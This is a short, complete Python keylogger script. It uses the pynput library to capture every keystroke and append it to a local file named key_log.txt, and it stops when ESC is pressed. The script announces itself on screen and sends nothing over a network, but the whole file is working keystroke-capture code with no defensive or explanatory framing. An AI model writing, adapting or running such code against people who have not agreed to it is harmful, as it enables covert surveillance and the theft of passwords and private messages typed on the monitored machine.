from pynput import keyboard
import os

# Log file path
log_file = "key_log.txt"

# Ensure log file exists
if not os.path.exists(log_file):
    open(log_file, "w").close()

def on_press(key):
    try:
        # Convert the key to a string
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys like ENTER, SHIFT, etc.
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    # Stop listener when ESC is pressed
    if key == keyboard.Key.esc:
        print("\n[+] Exiting keylogger...")
        return False

print("[*] Keylogger started. Press ESC to stop.")

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

